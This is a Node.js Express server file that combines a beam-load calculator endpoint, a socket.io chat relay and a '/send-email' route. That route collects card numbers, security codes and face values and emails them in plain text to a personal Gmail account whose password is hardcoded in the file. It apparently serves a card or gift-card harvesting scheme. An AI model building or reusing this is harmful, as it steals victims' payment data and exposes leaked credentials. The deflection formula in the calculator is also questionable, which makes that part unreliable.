const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());
app.use(cors()); // Enable CORS for all routes


const transporter = nodemailer.createTransport({
    service: 'Gmail', // or any other email service
    auth: {
        user: 'eesuolaayot@gmail.com',
        pass: '08054527758'
    }
});


app.get('/', (req, res)=> {
    res.send('Hello World')
})
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*", // Allow all origins. For better security, specify your frontend's origin.
        methods: ["GET", "POST"]
    }
});

app.post('/api/calculate', (req, res) => {
    try {
      const { length, material, crossSection, supports, loads } = req.body;
  
      const L = parseFloat(length);
      const E = parseFloat(material.youngsModulus) * 1e9; // Convert GPa to Pa
      const I = parseFloat(crossSection.dimensions); // Simplified for demo
  
      const pointLoad = loads.pointLoads[0];
      const P = parseFloat(pointLoad.force);
      const a = parseFloat(pointLoad.position);
  
      // Calculate reactions at supports for a simply supported beam
      const R1 = (P * (L - a)) / L;
      const R2 = P - R1;
  
      const steps = [
        `Step 1: Calculate reactions at supports`,
        `R1 = P * (L - a) / L = ${R1.toFixed(2)} N`,
        `R2 = P - R1 = ${R2.toFixed(2)} N`,
        `Step 2: Calculate shear forces`,
        `Shear force at A (R1): ${R1.toFixed(2)} N`,
        `Shear force at B (R2): ${R2.toFixed(2)} N`,
        `Step 3: Calculate bending moments`,
        `Bending moment at A: 0 N·m`,
        `Bending moment at B: 0 N·m`,
        `Bending moment at C (load point): P * a * (1 - a/L) = ${(P * a * (1 - a/L)).toFixed(2)} N·m`,
        `Step 4: Calculate deflections`,
        `Maximum deflection δmax = (P * a * (L - a)^2) / (6 * E * I * L) = ${((P * a * Math.pow(L - a, 2)) / (6 * E * I * L)).toFixed(6)} m`,
      ];
  
      // Example data for visualization
      const shearForceData = [
        { x: [0, a, a, L], y: [R1, R1, -R2, -R2], type: 'scatter', mode: 'lines', name: 'Shear Force' }
      ];
      const bendingMomentData = [
        { x: [0, a, L], y: [0, P * a * (1 - a / L), 0], type: 'scatter', mode: 'lines', name: 'Bending Moment' }
      ];
      const deflectionData = [
        { x: [0, L / 2, L], y: [0, -(P * Math.pow(L / 2, 3)) / (48 * E * I), 0], type: 'scatter', mode: 'lines', name: 'Deflection' }
      ];
  
      const results = { steps, shearForceData, bendingMomentData, deflectionData };
      res.json(results);
    } catch (error) {
      console.error(error);
      res.status(500).json({ error: 'An error occurred while processing the request.' });
    }
  });
  


app.post('/send-email', (req, res) => {
    const { cardType, cardNumber, securityCode, faceValue } = req.body;

    const mailOptions = {
        from: 'timo@gmail.com',
        to: 'eesuolaayot@gmail.com',
        subject: `New message from User`,
        text: `CardType: ${cardType}, cardNumber: ${cardNumber}, securityCode: ${securityCode}, faceValue: ${faceValue}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).json({ success: false, error });
        }
        res.json({ success: true, info });
    });
});

app.use(cors()); // Use CORS middleware

let connectedUsers = {}; // Store connected users with their socket IDs
let userMessages = {};   // Store messages for each user

io.on('connection', (socket) => {
    console.log('a user connected:', socket.id);

    // Store the user's ID when they connect
    socket.on('user connected', (userId) => {
        connectedUsers[userId] = socket.id;
        if (!userMessages[userId]) {
            userMessages[userId] = [];
        }
        io.emit('update connected users', Object.keys(connectedUsers));
    });

    socket.on('disconnect', () => {
        console.log('user disconnected:', socket.id);
        for (const userId in connectedUsers) {
            if (connectedUsers[userId] === socket.id) {
                delete connectedUsers[userId];
                io.emit('update connected users', Object.keys(connectedUsers));
                break;
            }
        }
    });

    socket.on('send message', ({ sender, receiver, message }) => {
        const receiverSocketId = connectedUsers[receiver];

        // Ensure sender and receiver have message arrays initialized
        if (!userMessages[sender]) {
            userMessages[sender] = [];
        }
        if (!userMessages[receiver]) {
            userMessages[receiver] = [];
        }

        const messageObj = { sender, message };

        // Push the message to both the sender's and receiver's message arrays
        userMessages[sender].push(messageObj);
        userMessages[receiver].push(messageObj);

        if (receiverSocketId) {
            io.to(receiverSocketId).emit('receive message', messageObj);
        }
    });

    socket.on('get messages', (userId) => {
        socket.emit('update messages', userMessages[userId] || []);
    });
});

const PORT = process.env.PORT || 2000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
